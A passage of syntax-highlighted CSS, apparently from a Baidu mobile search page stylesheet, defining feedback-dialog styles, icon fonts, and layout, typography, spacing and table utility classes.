rgba(0,0,0,.075);<span class="attribute">-webkit-transition</span>:border linear .2s,box-shadow linear .2s;<span class="attribute">-moz-transition</span>:border linear .2s,box-shadow linear .2s;<span class="attribute">-ms-transition</span>:border linear .2s,box-shadow linear .2s;<span class="attribute">-o-transition</span>:border linear .2s,box-shadow linear .2s;<span class="attribute">transition</span>:border linear .2s,box-shadow linear .2s&#125;\n<span class="variable">.fb-email</span>&#123;font-size:13px!important;<span class="attribute">color</span>:#000&#125;\n<span class="variable">.fb-email</span>::-webkit-input-placeholder&#123;font-size:13px!important;<span class="attribute">color</span>:#9a9a9a&#125;\n<span class="variable">.fb-email</span>:-moz-placeholder&#123;font-size:13px!important;<span class="attribute">color</span>:#9a9a9a&#125;\n<span class="variable">.fb-email</span>::-moz-placeholder&#123;font-size:13px!important;<span class="attribute">color</span>:#9a9a9a&#125;\n<span class="variable">.fb-email</span>:-ms-input-placeholder&#123;font-size:13px!important;<span class="attribute">color</span>:#9a9a9a&#125;\n<span class="variable">.fb-cut-block</span>&#123;height:15px;<span class="attribute">padding-bottom</span>:10px&#125;\n<span class="variable">.fb-canvas-block</span>&#123;height:172px;<span class="attribute">border</span>:1px solid #ccc;<span class="attribute">margin-bottom</span>:10px;<span class="attribute">position</span>:relative;<span class="attribute">overflow</span>:hidden;<span class="attribute">width</span>:100%;<span class="attribute">background-position</span>:center;<span class="attribute">box-sizing</span>:border-box&#125;\n<span class="variable">.fb-canvas-block</span> img&#123;width:350px;<span class="attribute">position</span>:absolute&#125;\n<span class="variable">.fb-canvas-block</span> img[src=\"\"]&#123;opacity:0&#125;\n<span class="variable">.fb-cut-input</span>&#123;width:14px;<span class="attribute">height</span>:14px;<span class="attribute">margin</span>:0;<span class="attribute">margin-right</span>:10px;<span class="attribute">display</span>:inline-block;<span class="attribute">border</span>:1px solid #ccc&#125;\n<span class="variable">.fb-cut-btn</span>&#123;width:60px!important&#125;\n#fb_tips_span&#123;vertical-align:middle&#125;\n#fb_popwindow&#123;display:block;<span class="attribute">left</span>:457px;<span class="attribute">top</span>:69.5px;<span class="attribute">position</span>:absolute;<span class="attribute">width</span>:450px;<span class="attribute">z-index</span>:999999;<span class="attribute">background</span>:none repeat scroll 0 0 #fff;<span class="attribute">border</span>:1px solid #999;<span class="attribute">border-radius</span>:3px;<span class="attribute">box-shadow</span>:0 0 9px #999;<span class="attribute">padding</span>:0&#125;\n#feedback_dialog_content&#123;text-align:center&#125;\n#fb_right_post_save:hover&#123;background-image:url(data:image\/png;<span class="attribute">base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAACCAMAAACuX0YVAAAABlBMVEVnpv85i\/9PO5r4AAAAD0lEQVR42gEEAPv\/AAAAAQAFAAIros7PAAAAAElFTkSuQmCC);background-repeat</span>:repeat-x;<span class="attribute">box-shadow</span>:1px 1px 1px rgba(0,0,0,.4);<span class="attribute">-webkit-box-shadow</span>:1px 1px 1px rgba(0,0,0,.4);<span class="attribute">-moz-box-shadow</span>:1px 1px 1px rgba(0,0,0,.4);<span class="attribute">-o-box-shadow</span>:1px 1px 1px rgba(0,0,0,.4)&#125;\n<span class="variable">.fb-select-icon</span>&#123;position:absolute;<span class="attribute">bottom</span>:6px;<span class="attribute">right</span>:5px;<span class="attribute">width</span>:16px;<span class="attribute">height</span>:16px;<span class="attribute">box-sizing</span>:content-box;<span class="attribute">background-position</span>:center center;<span class="attribute">background-repeat</span>:no-repeat;<span class="attribute">background-size</span>:7px 4px;<span class="attribute">-webkit-background-size</span>:7px 4px;<span class="attribute">background-image</span>:url(data:image\/png;<span class="attribute">base64,iVBORw0KGgoAAAANSUhEUgAAAAcAAAAECAYAAABCxiV9AAAABGdBTUEAALGPC\/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABmJLR0QAAAAAAAD5Q7t\/AAAACXBIWXMAAAsSAAALEgHS3X78AAAAKElEQVQI12Ps7Or6z4ADMDIwMDBgU1BeVsbICOMgKygvK2PEMAbdBAAhxA08t5Q3VgAAAABJRU5ErkJggg==)&#125;\n.fb-select-shorter&#123;position</span>:relative;<span class="attribute">min-height</span>:28px&#125;\n<span class="variable">.fb-type-container</span>&#123;line-height:28px;<span class="attribute">position</span>:absolute;<span class="attribute">top</span>:28px;<span class="attribute">width</span>:100%;<span class="attribute">background-color</span>:#fff;<span class="attribute">border</span>:1px solid #ccc;<span class="attribute">z-index</span>:300;<span class="attribute">margin-left</span>:-1px;<span class="attribute">display</span>:none&#125;\n<span class="variable">.fb-type-item</span>,<span class="variable">.fb-type-selected</span>&#123;height:28px;<span class="attribute">line-height</span>:30px;<span class="attribute">padding-left</span>:4px&#125;\n<span class="variable">.fb-type-item</span>:hover&#123;background:#f5f5f5&#125;\n<span class="variable">.fb-checkbox</span>&#123;position:relative;<span class="attribute">border-bottom</span>:1px solid #eee;<span class="attribute">height</span>:34px;<span class="attribute">line-height</span>:35px&#125;\n<span class="variable">.fb-checkbox</span>:last-child&#123;border-bottom:0&#125;\n<span class="variable">.fb-list-wrapper</span>&#123;margin-top:-10px&#125;\n<span class="variable">.fb-textarea-sug</span> textarea&#123;margin-top:0&#125;\n@media screen and (min-width:1921px)&#123;\n<span class="variable">.slowmsg</span>&#123;left:50%!important;<span class="attribute">-webkit-transform</span>:translateX(-50%);<span class="attribute">-ms-transform</span>:translateX(-50%);<span class="attribute">transform</span>:translateX(-50%)&#125;\n<span class="variable">.wrapper_l</span> #head&#123;-webkit-transform-style:preserve-3d;<span class="attribute">transform-style</span>:preserve-3d&#125;\n#head #head_wrapper&#123;width:1196px;<span class="attribute">margin</span>:0 auto;<span class="attribute">position</span>:relative;<span class="attribute">-webkit-transform</span>:translate3d(-52px,0,1px);<span class="attribute">transform</span>:translate3d(-52px,0,1px)&#125;\n#head <span class="variable">.headBlock</span>&#123;-webkit-box-sizing:border-box;<span class="attribute">box-sizing</span>:border-box;<span class="attribute">margin-left</span>:auto;<span class="attribute">margin-right</span>:auto;<span class="attribute">width</span>:1196px;<span class="attribute">padding-left</span>:121px;<span class="attribute">-webkit-transform</span>:translate3d(-52px,0,0);<span class="attribute">transform</span>:translate3d(-52px,0,0)&#125;\n#s_tab<span class="variable">.s_tab</span>&#123;padding-left:0&#125;\n#s_tab<span class="variable">.s_tab</span> <span class="variable">.s_tab_inner</span>&#123;display:block;<span class="attribute">-webkit-box-sizing</span>:border-box;<span class="attribute">box-sizing</span>:border-box;<span class="attribute">padding-left</span>:77px;<span class="attribute">width</span>:1212px;<span class="attribute">margin</span>:0 auto&#125;\n#con-at <span class="variable">.result-op</span>&#123;margin-left:auto;<span class="attribute">margin-right</span>:auto;<span class="attribute">-webkit-transform</span>:translateX(-60px);<span class="attribute">-ms-transform</span>:translateX(-60px);<span class="attribute">transform</span>:translateX(-60px)&#125;\n#wrapper_wrapper&#123;margin-left:-88px&#125;\n#container&#123;-webkit-box-sizing:border-box;<span class="attribute">box-sizing</span>:border-box;<span class="attribute">width</span>:1212px;<span class="attribute">margin</span>:0 auto&#125;\n<span class="variable">.foot-inner</span>&#123;width:1212px;<span class="attribute">margin</span>:0 auto&#125;\n&#125;\n@font-face&#123;font-family:cicons;<span class="attribute">font-weight</span>:400;<span class="attribute">font-style</span>:normal;<span class="attribute">src</span>:url(\/\/m<span class="variable">.baidu</span><span class="variable">.com</span>\/se\/static\/font\/cicon<span class="variable">.eot</span>?t=1561460962188#);<span class="attribute">src</span>:url(\/\/m<span class="variable">.baidu</span><span class="variable">.com</span>\/se\/static\/font\/cicon<span class="variable">.eot</span>?t=1561460962188#iefix) format('embedded-opentype'),url(\/\/m<span class="variable">.baidu</span><span class="variable">.com</span>\/se\/static\/font\/cicon<span class="variable">.woff</span>?t=1561460962188#) format('woff'),url(\/\/m<span class="variable">.baidu</span><span class="variable">.com</span>\/se\/static\/font\/cicon<span class="variable">.ttf</span>?t=1561460962188#) format('truetype'),url(\/\/m<span class="variable">.baidu</span><span class="variable">.com</span>\/se\/static\/font\/cicon<span class="variable">.svg</span>?t=1561460962188#cicons) format('svg')&#125;\nhtml&#123;font-size:100px&#125;\nhtml body&#123;font-size:.14rem;<span class="attribute">font-size</span>:14px&#125;\n#bottom_layer,#bottom_space,#s_wrap&#123;display:none&#125;\n[data-pmd] a&#123;color:#333;<span class="attribute">text-decoration</span>:none;<span class="attribute">-webkit-tap-highlight-color</span>:rgba(23,23,23,.1)&#125;\n[data-pmd] <span class="variable">.c-icon</span>&#123;display:inline;<span class="attribute">width</span>:auto;<span class="attribute">height</span>:auto;<span class="attribute">vertical-align</span>:baseline;<span class="attribute">overflow</span>:auto&#125;\n[data-pmd] <span class="variable">.c-row-tile</span>&#123;position:relative;<span class="attribute">margin</span>:0 -9px&#125;\n[data-pmd] <span class="variable">.c-row-tile</span> <span class="variable">.c-row</span>&#123;padding:0 9px&#125;\n[data-pmd] <span class="variable">.c-row</span> :last-child,[data-pmd] <span class="variable">.c-row-tile</span> :last-child&#123;margin-right:0&#125;\n[data-pmd] <span class="variable">.c-row</span> *,[data-pmd] <span class="variable">.c-row-tile</span> *&#123;-webkit-box-sizing:border-box;<span class="attribute">box-sizing</span>:border-box&#125;\n[data-pmd] <span class="variable">.c-icon</span>&#123;font-family:cicons!important;<span class="attribute">font-style</span>:normal;<span class="attribute">-webkit-font-smoothing</span>:antialiased&#125;\n[data-pmd] <span class="variable">.c-result</span>&#123;padding:0;<span class="attribute">margin</span>:0;<span class="attribute">background</span>:0;<span class="attribute">border</span>:0 none&#125;\n[data-pmd] <span class="variable">.c-blocka</span>&#123;display:block&#125;\n[data-pmd] a <span class="variable">.c-title</span>,[data-pmd] a<span class="variable">.c-title</span>&#123;font:18px\/26px Arial,Helvetica,sans-serif;<span class="attribute">color</span>:#000&#125;\n[data-pmd] a:visited <span class="variable">.c-title</span>,[data-pmd] a:visited<span class="variable">.c-title</span>&#123;color:#999&#125;\n[data-pmd] <span class="variable">.sfa-view</span> <span class="variable">.c-title</span>,[data-pmd] <span class="variable">.sfa-view</span> a:visited <span class="variable">.c-title</span>,[data-pmd] <span class="variable">.sfa-view</span> a:visited<span class="variable">.c-title</span>&#123;color:#000;<span class="attribute">font</span>:18px\/26px Arial,Helvetica,sans-serif&#125;\n[data-pmd] <span class="variable">.c-title</span>,[data-pmd] <span class="variable">.c-title-noclick</span>&#123;font:18px\/26px Arial,Helvetica,sans-serif;<span class="attribute">color</span>:#999&#125;\n[data-pmd] <span class="variable">.c-title-nowrap</span>&#123;padding-right:33px;<span class="attribute">width</span>:100%;<span class="attribute">position</span>:relative;<span class="attribute">white-space</span>:nowrap;<span class="attribute">box-sizing</span>:border-box&#125;\n[data-pmd] <span class="variable">.c-title-nowrap</span> <span class="variable">.c-text</span>&#123;display:inline-block;<span class="attribute">vertical-align</span>:middle&#125;\n[data-pmd] <span class="variable">.c-title-nowrap</span> <span class="variable">.c-title-text</span>&#123;display:inline-block;<span class="attribute">max-width</span>:100%;<span class="attribute">white-space</span>:nowrap;<span class="attribute">overflow</span>:hidden;<span class="attribute">text-overflow</span>:ellipsis;<span class="attribute">vertical-align</span>:bottom&#125;\n[data-pmd] <span class="variable">.c-font-sigma</span>&#123;font:22px\/30px Arial,Helvetica,sans-serif&#125;\n[data-pmd] <span class="variable">.c-font-large</span>&#123;font:18px\/26px Arial,Helvetica,sans-serif&#125;\n[data-pmd] <span class="variable">.c-font-big</span>&#123;font:18px\/26px Arial,Helvetica,sans-serif&#125;\n[data-pmd] <span class="variable">.c-font-medium</span>&#123;font:14px\/22px Arial,Helvetica,sans-serif&#125;\n[data-pmd] <span class="variable">.c-font-normal</span>&#123;font:13px\/21px Arial,Helvetica,sans-serif&#125;\n[data-pmd] <span class="variable">.c-font-small</span>&#123;font:12px\/20px Arial,Helvetica,sans-serif&#125;\n[data-pmd] <span class="variable">.c-font-tiny</span>&#123;font:12px\/20px Arial,Helvetica,sans-serif&#125;\n[data-pmd] <span class="variable">.c-price</span>&#123;font:18px\/26px Arial,Helvetica,sans-serif;<span class="attribute">color</span>:#f60&#125;\n[data-pmd] <span class="variable">.c-title-wrap</span>&#123;display:block&#125;\n[data-pmd] <span class="variable">.c-title-nowrap</span>&#123;display:none&#125;\n@media (min-width:376px)&#123;\n[data-pmd] <span class="variable">.c-title</span>&#123;display:block;<span class="attribute">max-width</span>:100%;<span class="attribute">white-space</span>:nowrap;<span class="attribute">overflow</span>:hidden;<span class="attribute">text-overflow</span>:ellipsis;<span class="attribute">vertical-align</span>:middle&#125;\n[data-pmd] <span class="variable">.c-title-nowrap</span>&#123;display:block;<span class="attribute">overflow</span>:visible&#125;\n[data-pmd] <span class="variable">.c-title-wrap</span>&#123;display:none&#125;\n&#125;\n[data-pmd] <span class="variable">.c-abstract</span>&#123;color:#555&#125;\n[data-pmd] <span class="variable">.c-showurl</span>&#123;color:#999;<span class="attribute">font</span>:13px\/21px Arial,Helvetica,sans-serif&#125;\n[data-pmd] <span class="variable">.c-gray</span>&#123;color:#999;<span class="attribute">font</span>:13px\/21px Arial,Helvetica,sans-serif&#125;\n[data-pmd] <span class="variable">.c-moreinfo</span>&#123;color:#555;<span class="attribute">text-align</span>:right;<span class="attribute">font</span>:13px\/21px Arial,Helvetica,sans-serif&#125;\n[data-pmd] <span class="variable">.c-foot-icon</span>&#123;display:inline-block;<span class="attribute">position</span>:relative;<span class="attribute">top</span>:.02rem;<span class="attribute">background</span>:url(\/\/m<span class="variable">.baidu</span><span class="variable">.com</span>\/static\/search\/sprite<span class="variable">.png</span>) no-repeat;<span class="attribute">-webkit-background-size</span>:1.9rem 1.42rem;<span class="attribute">background-size</span>:1.9rem 1.42rem&#125;\n[data-pmd] <span class="variable">.c-foot-icon-</span>16&#123;width:.16rem;<span class="attribute">height</span>:.13rem&#125;\n[data-pmd] <span class="variable">.c-foot-icon-</span>16-aladdin&#123;display:none;<span class="attribute">background-position</span>:0 -.98rem&#125;\n[data-pmd] <span class="variable">.c-foot-icon-</span>16-lightapp&#123;background-position:-.2rem -.98rem&#125;\n[data-pmd] <span class="variable">.c-visited</span>,[data-pmd] <span class="variable">.c-visited</span> <span class="variable">.c-title</span>,[data-pmd] <span class="variable">.c-visited</span><span class="variable">.c-title</span>&#123;color:#999!important&#125;\n[data-pmd] <span class="variable">.c-container</span>&#123;margin:8px 0;<span class="attribute">padding</span>:10px 9px 15px;<span class="attribute">background-color</span>:#fff;<span class="attribute">width</span>:auto;<span class="attribute">color</span>:#555;<span class="attribute">font</span>:13px\/21px Arial,Helvetica,sans-serif;<span class="attribute">word-break</span>:break-word;<span class="attribute">word-wrap</span>:break-word;<span class="attribute">border</span>:0 none&#125;\n[data-pmd] <span class="variable">.c-container-tight</span>&#123;padding:10px 9px 15px;<span class="attribute">background-color</span>:#fff;<span class="attribute">width</span>:auto;<span class="attribute">color</span>:#555;<span class="attribute">font</span>:13px\/21px Arial,Helvetica,sans-serif;<span class="attribute">word-break</span>:break-word;<span class="attribute">word-wrap</span>:break-word;<span class="attribute">border</span>:0 none&#125;\n[data-pmd] <span class="variable">.c-container-tile</span>&#123;margin:0;<span class="attribute">padding</span>:0&#125;\n[data-pmd] <span class="variable">.c-span-middle</span>&#123;display:-webkit-box;<span class="attribute">display</span>:-moz-box;<span class="attribute">display</span>:-ms-flexbox;<span class="attribute">display</span>:-webkit-flex;<span class="attribute">display</span>:flex;<span class="attribute">-webkit-box-orient</span>:vertical;<span class="attribute">-moz-box-orient</span>:vertical;<span class="attribute">-webkit-box-direction</span>:normal;<span class="attribute">-moz-box-direction</span>:normal;<span class="attribute">-webkit-flex-direction</span>:column;<span class="attribute">-ms-flex-direction</span>:column;<span class="attribute">flex-direction</span>:column;<span class="attribute">-moz-box-pack</span>:center;<span class="attribute">-webkit-box-pack</span>:center;<span class="attribute">-ms-flex-pack</span>:center;<span class="attribute">-webkit-justify-content</span>:center;<span class="attribute">justify-content</span>:center&#125;\n[data-pmd] <span class="variable">.c-line-clamp</span>2,[data-pmd] <span class="variable">.c-line-clamp</span>3,[data-pmd] <span class="variable">.c-line-clamp</span>4,[data-pmd] <span class="variable">.c-line-clamp</span>5&#123;display:-webkit-box;<span class="attribute">-webkit-box-orient</span>:vertical;<span class="attribute">overflow</span>:hidden;<span class="attribute">text-overflow</span>:ellipsis;<span class="attribute">margin-bottom</span>:4px;<span class="attribute">white-space</span>:normal&#125;\n[data-pmd] <span class="variable">.c-line-clamp</span>2&#123;-webkit-line-clamp:2&#125;\n[data-pmd] <span class="variable">.c-line-clamp</span>3&#123;-webkit-line-clamp:3&#125;\n[data-pmd] <span class="variable">.c-line-clamp</span>4&#123;-webkit-line-clamp:4&#125;\n[data-pmd] <span class="variable">.c-line-clamp</span>5&#123;-webkit-line-clamp:5&#125;\n[data-pmd] <span class="variable">.c-line-clamp</span>1&#123;display:block;<span class="attribute">overflow</span>:hidden;<span class="attribute">text-overflow</span>:ellipsis;<span class="attribute">white-space</span>:nowrap&#125;\n[data-pmd] <span class="variable">.c-line-top</span>&#123;border-top:1px solid #eee&#125;\n[data-pmd] <span class="variable">.c-line-dotted-top</span>&#123;border-top:1px dotted #eee&#125;\n[data-pmd] <span class="variable">.c-line-bottom</span>&#123;border-bottom:1px solid #eee&#125;\n[data-pmd] <span class="variable">.c-line-dotted-bottom</span>&#123;border-bottom:1px dotted #eee&#125;\n[data-pmd] <span class="variable">.c-color</span>&#123;color:#555&#125;\n[data-pmd] <span class="variable">.c-color-gray-a</span>&#123;color:#666&#125;\n[data-pmd] <span class="variable">.c-color-gray</span>&#123;color:#999&#125;\n[data-pmd] <span class="variable">.c-color-link</span>&#123;color:#000&#125;\n[data-pmd] <span class="variable">.c-color-noclick</span>&#123;color:#999&#125;\n[data-pmd] <span class="variable">.c-color-url</span>&#123;color:#999&#125;\n[data-pmd] <span class="variable">.c-color-red</span>&#123;color:#e43&#125;\n[data-pmd] <span class="variable">.c-color-red</span>:visited&#123;color:#e43&#125;\n[data-pmd] <span class="variable">.c-color-orange</span>&#123;color:#f60&#125;\n[data-pmd] <span class="variable">.c-color-orange</span>:visited&#123;color:#f60&#125;\n[data-pmd] <span class="variable">.c-color-icon-special</span>&#123;color:#b4b4b4&#125;\n[data-pmd] <span class="variable">.c-color-split</span>&#123;color:#eee&#125;\n[data-pmd] <span class="variable">.c-bg-color-white</span>&#123;background-color:#fff&#125;\n[data-pmd] <span class="variable">.c-bg-color-black</span>&#123;background-color:#000&#125;\n[data-pmd] <span class="variable">.se-page-bd</span> <span class="variable">.c-bg-color-gray</span>&#123;background-color:#f1f1f1&#125;\n[data-pmd] <span class="variable">.sfa-view</span> <span class="variable">.c-bg-color-gray</span>&#123;background-color:#f2f2f2&#125;\n[data-pmd] <span class="variable">.c-gap-top-zero</span>&#123;margin-top:0&#125;\n[data-pmd] <span class="variable">.c-gap-right-zero</span>&#123;margin-right:0&#125;\n[data-pmd] <span class="variable">.c-gap-bottom-zero</span>&#123;margin-bottom:0&#125;\n[data-pmd] <span class="variable">.c-gap-left-zero</span>&#123;margin-left:0&#125;\n[data-pmd] <span class="variable">.c-gap-top</span>&#123;margin-top:8px&#125;\n[data-pmd] <span class="variable">.c-gap-right</span>&#123;margin-right:8px&#125;\n[data-pmd] <span class="variable">.c-gap-bottom</span>&#123;margin-bottom:8px&#125;\n[data-pmd] <span class="variable">.c-gap-left</span>&#123;margin-left:8px&#125;\n[data-pmd] <span class="variable">.c-gap-top-small</span>&#123;margin-top:4px&#125;\n[data-pmd] <span class="variable">.c-gap-right-small</span>&#123;margin-right:4px&#125;\n[data-pmd] <span class="variable">.c-gap-bottom-small</span>&#123;margin-bottom:4px&#125;\n[data-pmd] <span class="variable">.c-gap-left-small</span>&#123;margin-left:4px&#125;\n[data-pmd] <span class="variable">.c-gap-top-large</span>&#123;margin-top:12px&#125;\n[data-pmd] <span class="variable">.c-gap-right-large</span>&#123;margin-right:12px&#125;\n[data-pmd] <span class="variable">.c-gap-bottom-large</span>&#123;margin-bottom:12px&#125;\n[data-pmd] <span class="variable">.c-gap-left-large</span>&#123;margin-left:12px&#125;\n[data-pmd] <span class="variable">.c-gap-left-middle</span>&#123;margin-left:8px&#125;\n[data-pmd] <span class="variable">.c-gap-right-middle</span>&#123;margin-right:8px&#125;\n[data-pmd] <span class="variable">.c-gap-inner-top-zero</span>&#123;padding-top:0&#125;\n[data-pmd] <span class="variable">.c-gap-inner-right-zero</span>&#123;padding-right:0&#125;\n[data-pmd] <span class="variable">.c-gap-inner-bottom-zero</span>&#123;padding-bottom:0&#125;\n[data-pmd] <span class="variable">.c-gap-inner-left-zero</span>&#123;padding-left:0&#125;\n[data-pmd] <span class="variable">.c-gap-inner-top</span>&#123;padding-top:8px&#125;\n[data-pmd] <span class="variable">.c-gap-inner-right</span>&#123;padding-right:8px&#125;\n[data-pmd] <span class="variable">.c-gap-inner-bottom</span>&#123;padding-bottom:8px&#125;\n[data-pmd] <span class="variable">.c-gap-inner-left</span>&#123;padding-left:8px&#125;\n[data-pmd] <span class="variable">.c-gap-inner-top-small</span>&#123;padding-top:4px&#125;\n[data-pmd] <span class="variable">.c-gap-inner-right-small</span>&#123;padding-right:4px&#125;\n[data-pmd] <span class="variable">.c-gap-inner-bottom-small</span>&#123;padding-bottom:4px&#125;\n[data-pmd] <span class="variable">.c-gap-inner-left-small</span>&#123;padding-left:4px&#125;\n[data-pmd] <span class="variable">.c-gap-inner-top-large</span>&#123;padding-top:12px&#125;\n[data-pmd] <span class="variable">.c-gap-inner-right-large</span>&#123;padding-right:12px&#125;\n[data-pmd] <span class="variable">.c-gap-inner-bottom-large</span>&#123;padding-bottom:12px&#125;\n[data-pmd] <span class="variable">.c-gap-inner-left-large</span>&#123;padding-left:12px&#125;\n[data-pmd] <span class="variable">.c-gap-inner-left-middle</span>&#123;padding-left:8px&#125;\n[data-pmd] <span class="variable">.c-gap-inner-right-middle</span>&#123;padding-right:8px&#125;\n[data-pmd] <span class="variable">.c-img</span>&#123;position:relative;<span class="attribute">display</span>:block;<span class="attribute">width</span>:100%;<span class="attribute">border</span>:0 none;<span class="attribute">background</span>:#f7f7f7 url(\/\/m<span class="variable">.baidu</span><span class="variable">.com</span>\/static\/search\/image_default<span class="variable">.png</span>) center center no-repeat;<span class="attribute">margin</span>:4px 0&#125;\n[data-pmd] <span class="variable">.c-img</span> img&#123;width:100%&#125;\n[data-pmd] <span class="variable">.c-img</span> <span class="variable">.c-img-text</span>&#123;position:absolute;<span class="attribute">left</span>:0;<span class="attribute">bottom</span>:0;<span class="attribute">width</span>:100%;<span class="attribute">height</span>:.16rem;<span class="attribute">background</span>:rgba(51,51,51,.4);<span class="attribute">font-size</span>:.12rem;<span class="attribute">line-height</span>:1.33333333;<span class="attribute">color</span>:#fff;<span class="attribute">text-align</span>:center&#125;\n[data-pmd] <span class="variable">.c-img-l</span>,[data-pmd] <span class="variable">.c-img-s</span>,[data-pmd] <span class="variable">.c-img-v</span>,[data-pmd] <span class="variable">.c-img-w</span>,[data-pmd] <span class="variable">.c-img-x</span>,[data-pmd] <span class="variable">.c-img-y</span>,[data-pmd] <span class="variable">.c-img-z</span>&#123;height:0;<span class="attribute">overflow</span>:hidden&#125;\n[data-pmd] <span class="variable">.c-img-s</span>&#123;padding-bottom:100%&#125;\n[data-pmd] <span class="variable">.c-img-l</span>&#123;padding-bottom:133.33333333%&#125;\n[data-pmd] <span class="variable">.c-img-w</span>&#123;padding-bottom:56.25%&#125;\n[data-pmd] <span class="variable">.c-img-x</span>&#123;padding-bottom:75%&#125;\n[data-pmd] <span class="variable">.c-img-y</span>&#123;padding-bottom:66.66666667%&#125;\n[data-pmd] <span class="variable">.c-img-v</span>&#123;padding-bottom:33.33333333%&#125;\n[data-pmd] <span class="variable">.c-img-z</span>&#123;padding-bottom:40%&#125;\n[data-pmd] <span class="variable">.c-table</span>&#123;width:100%;<span class="attribute">border-collapse</span>:collapse;<span class="attribute">border-spacing</span>:0;<span class="attribute">color</span>:#000&#125;\n[data-pmd] <span class="variable">.c-table</span> th&#123;color:#999&#125;\n[data-pmd] <span class="variable">.c-table</span> td,[data-pmd] <span class="variable">.c-table</span> th&#123;border-bottom:1px solid #eee;<span class="attribute">text-align</span>:left;<span class="attribute">font-weight</span>:400;<span class="attribute">padding</span>:8px 0&#125;\n[data-pmd] <span class="variable">.c-table-hihead</span> th&#123;padding:0;<span class="attribute">border-bottom</span>:0 none;<span class="attribute">background-color</span>:#f6f6f6;<span class="attribute">line-height</span>:.37rem&#125;\n[data-pmd] <span class="variable">.c-table-hihead</span> div&#123;background-color:#f6f6f6&#125;\n[data-pmd] <span class="variable">.c-table-hihead</span> th:first-child div&#123;margin-left:-9px;<span class="attribute">padding-left</span>:9px&#125;\n[data-pmd] <span class="variable">.c-table-hihead</span> th:last-child div&#123;margin-right:-9px;<span class="attribute">padding-right</span>:9px&#125;\n[data-pmd] <span class="variable">.c-table-noborder</span> td,[data-pmd] <span class="variable">.c-table-noborder</span> th&#123;border-bottom:0 none&#125;\n[data-pmd] <span class="variable">.c-table-slink</span> tbody&#123;color:#555;<span class="attribute">border-bottom</span>:1px solid #eee&#125;\n[data-pmd] <span class="variable">.c-table-slink</span> tbody th&#123;border-bottom:1px solid #eee;<span class="attribute">padding</span>:0&#125;\n[data-pmd] <span class="variable">.c-table-slink</span> tbody td&#123;border-bottom:0;<span class="attribute">padding</span>:0&#125;\n[data-pmd] <span class="variable">.c-table-slink</span> tbody td <span class="variable">.c-slink-auto</span>&#123;margin:5px 0&#125;\n[data-pmd] <span class="variable">.c-table-slink</span> tbody tr:first-child td,[data-pmd] <span class="variable">.c-table-slink</span> tbody tr:first-child th&#123;padding:8px 0&#125;\n[data-pmd] <span class="variable">.c-table-slink</span> tbody tr:nth-child(2) td,[data-pmd] <span class="variable">.c-table-slink</span> tbody tr:nth-child(2) th&#123;padding-top:8px&#125;\n[data-pmd] <span class="variable">.c-table-slink</span> tbody tr td,[data-pmd] <span class="variable">.c-table-slink</span> tbody tr th&#123;padding-bottom:4px&#125;\n[data-pmd] <span class="variable">.c-table-slink</span> tbody tr:last-child td,[data-pmd] <span class="variable">.c-table-slink</span> tbody tr:last-child th&#123;padding-bottom:8px&#125;\n[data-pmd] <span class="variable">.c-table-abstract</span> tbody&#123;color:#555;<span class="attribute">border-bottom</span>:1px solid #eee&#125;\n[data-pmd] <span class="variable">.c-table-abstract</span> tbody th&#123;border-bottom:1px solid #eee;<span class="attribute">padding</span>:0&#125;\n[data-pmd] <span class="variable">.c-table-abstract</span> tbody td&#123;border-bottom:0;<span class="attribute">padding</span>:0&#125;\n[data-pmd] <span class="variable">.c-table-abstract</span> tbody tr:first-child td,[data-pmd] <span class="variable">.c-table-abstract</span> tbody tr:first-child th,[data-pmd] <span class="variable">.c-table-abstract</span> tbody tr:nth-child(2) td,[data-pmd] <span class="variable">.c-table-abstract</span> tbody tr:nth-child(2) th&#123;padding-top:8px&#125;\n[data-pmd] <span class="variable">.c-table-abstract</span> tbody tr td,[data-pmd] <span class="variable">.c-table-abstract</span> tbody tr th&#123;padding-bottom:8px&#125;\n[data-pmd] <span class="variable">.c-table-abstract</span> <span class="variable">.c-table-gray</span>&#123;color:#999;<span class="attribute">font</span>:12px\/20px Arial,Helvetica,sans-serif&#125;\n[data-pmd] <span class="variable">.c-table-shaft</span> th&#123;color:#999&#125;\n[data-pmd] <span class="variable">.c-table-shaft</span> td,[data-pmd] <span class="variable">.c-table-shaft</span> th&#123;border-right:1px solid #eee;<span class="attribute">text-align</span>:center&#125;\n[data-pmd] <span class="variable">.c-table-shaft</span> td:last-child,[data-pmd] <span class="variable">.c-table-shaft</span> th:last-child&#123;border-right:0&#125;\n[data-pmd] <span class="variable">.c-table-shaft</span> tr:last-child td&#123;border-bottom:0&#125;\n[data-pmd] <span class="variable">.c-slink</span>&#123;width:auto;<span class="attribute">display</span>:-webkit-box;<span class="attribute">-webkit-box-orient</span>:horizontal;<span class="attribute">-webkit-box-direction</span>:normal;<span class="attribute">-webkit-box-pack</span>:justify;<span class="attribute">-webkit-box-align</span>:stretch;<span class="attribute">-webkit-box-lines</span>:single;<span class="attribute">display</span>:-webkit-flex;<span class="attribute">-webkit-flex-direction</span>:row;<span class="attribute">-webkit-justify-content</span>:space-between;<span class="attribute">-webkit-align-items</span>:stretch;<span class="attribute">-webkit-align-content</span>:flex-start;<span class="attribute">-webkit-flex-wrap</span>:nowrap&#125;\n[data-pmd] <span class="variable">.c-slink</span> <span class="variable">.c-slink-elem</span>,[data-pmd] <span class="variable">.c-slink</span> a&#123;position:relative;<span class="attribute">display</span>:block;<span class="attribute">-webkit-box-flex</span>:1;<span class="attribute">-webkit-flex</span>:1 1 auto;<span class="attribute">width</span>:16.66666667%;<span class="attribute">height</span>:.32rem;<span class="attribute">line-height</span>:2.28571429;<span class="attribute">padding</span>:0 .06rem;<span class="attribute">font-size</span>:.14rem;<span class="attribute">text-align</span>:center;<span class="attribute">text-decoration</span>:none;<span class="attribute">color</span>:#666;<span class="attribute">overflow</span>:hidden;<span class="attribute">text-overflow</span>:ellipsis;<span class="attribute">white-space</span>:nowrap&#125;\n[data-pmd] <span class="variable">.c-slink</span> <span class="variable">.c-slink-elem</span>::after,[data-pmd] <span class="variable">.c-slink</span> <span class="variable">.c-slink-elem</span>:first-child::before,[data-pmd] <span class="variable">.c-slink</span> a::after,[data-pmd] <span class="variable">.c-slink</span> a:first-child::before&#123;content:\"\";<span class="attribute">width</span>:1px;<span class="attribute">height</span>:.1rem;<span class="attribute">background-color</span>:#eee;<span class="attribute">position</span>:absolute;<span class="attribute">top</span>:.11rem;<span class="attribute">right</span>:0&#125;\n[data-pmd] <span class="variable">.c-slink</span> <span 